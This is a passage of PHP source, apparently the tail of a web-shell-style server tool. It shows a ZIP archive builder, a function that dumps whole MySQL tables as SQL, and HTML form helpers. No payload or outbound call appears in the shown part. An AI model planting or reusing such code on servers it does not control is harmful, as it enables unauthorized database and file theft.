						$a[]=$f;
					}
				}
				closedir($dh);
			}
		}
		return $a;
	}
	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;
	function unix2DosTime($unixtime = 0) {
		$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		if($timearray['year'] < 1980) {
			$timearray['year']    = 1980;
			$timearray['mon']     = 1;
			$timearray['mday']    = 1;
			$timearray['hours']   = 0;
			$timearray['minutes'] = 0;
			$timearray['seconds'] = 0;
		}
		return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	}
	function addFile($data, $name, $time = 0) {
		$name = str_replace('\\', '/', $name);
		$dtime = dechex($this->unix2DosTime($time));
		$hexdtime = '\x' . $dtime[6] . $dtime[7]
		. '\x' . $dtime[4] . $dtime[5]
		. '\x' . $dtime[2] . $dtime[3]
		. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function file() {
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) .	pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
	}
}
function sqldumptable($table, $fp=0) {
	$tabledump = "DROP TABLE IF EXISTS $table;\n";
	$tabledump .= "CREATE TABLE $table (\n";
	$firstfield=1;
	$fields = q("SHOW FIELDS FROM $table");
	while ($field = mysql_fetch_array($fields)) {
		if(!$firstfield) {
			$tabledump .= ",\n";
		} else {
			$firstfield=0;
		}
		$tabledump .= "   $field[Field] $field[Type]";
		if(!empty($field["Default"])) {
			$tabledump .= " DEFAULT '$field[Default]'";
		}
		if($field['Null'] != "YES") {
			$tabledump .= " NOT NULL";
		}
		if($field['Extra'] != "") {
			$tabledump .= " $field[Extra]";
		}
	}
	fr($fields);
	$keys = q("SHOW KEYS FROM $table");
	while ($key = mysql_fetch_array($keys)) {
		$kname=$key['Key_name'];
		if($kname != "PRIMARY" && $key['Non_unique'] == 0) {
			$kname="UNIQUE|$kname";
		}
		if(!is_array($index[$kname])) {
			$index[$kname] = array();
		}
		$index[$kname][] = $key['Column_name'];
	}
	fr($keys);
	while(list($kname, $columns) = @each($index)) {
		$tabledump .= ",\n";
		$colnames=implode($columns,",");
		if($kname == "PRIMARY") {
			$tabledump .= "   PRIMARY KEY ($colnames)";
		} else {
			if(substr($kname,0,6) == "UNIQUE") {
				$kname=substr($kname,7);
			}
			$tabledump .= "   KEY $kname ($colnames)";
		}
	}
	$tabledump .= "\n);\n\n";
	if($fp) {
		fwrite($fp,$tabledump);
	} else {
		echo $tabledump;
	}
	$rows = q("SELECT * FROM $table");
	$numfields = mysql_num_fields($rows);
	while ($row = mysql_fetch_array($rows)) {
		$tabledump = "INSERT INTO $table VALUES(";
		$fieldcounter=-1;
		$firstfield=1;
		while (++$fieldcounter<$numfields) {
			if(!$firstfield) {
				$tabledump.=", ";
			} else {
				$firstfield=0;
			}
			if(!isset($row[$fieldcounter])) {
				$tabledump .= "NULL";
			} else {
				$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
			}
		}
		$tabledump .= ");\n";
		if($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}
	}
	fr($rows);
	if($fp) {
		fwrite($fp,"\n");
	} else {
		echo "\n";
	}
}
function ue($str){return urlencode($str);}
function p($str){echo $str."\n";}
function tbhead() {p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');}
function tbfoot(){p('</table>');}
function makehide($name,$value=''){p('<input id="'.$name.'" type="hidden" name="'.$name.'" value="'.$value.'" />');}
function makeinput($arg = array()){
$arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
!$arg['type'] && $arg['type'] = 'text';
$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
if($arg['newline']) {
	p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
	} else {
	p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
	}
}
function makeselect($arg = array()){
if($arg['onchange']) {
	$onchange = 'onchange="'.$arg['onchange'].'"';
}
$arg['title'] = $arg['title'] ? $arg['title'] : '';
if($arg['newline']) p('<p>');
	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
	if(is_array($arg['option'])) {
		foreach ($arg['option'] as $key=>$value) {
			if($arg['selected']==$key) {
				p("<option value=\"$key\" selected>$value</option>");
			} else {
				p("<option value=\"$key\">$value</option>");
			}
		}
	}
p("</select>");
if($arg['newline']) p('</p>');
}
function formhead($arg = array()) {
!$arg['method'] && $arg['method'] = 'post';
!$arg['action'] && $arg['action'] = $self;
$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
!$arg['name'] && $arg['name'] = 'form1';
p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
if($arg['title']) {p('<h2>'.$arg['title'].' &raquo;</h2>');}
}
function maketext($arg = array()){
!$arg['cols'] && $arg['cols'] = 100;
!$arg['rows'] && $arg['rows'] = 25;
$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}
function formfooter($name=''){!$name && $name = 'submit';p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit" /></p>'."\n</form>");}
exit();
?>
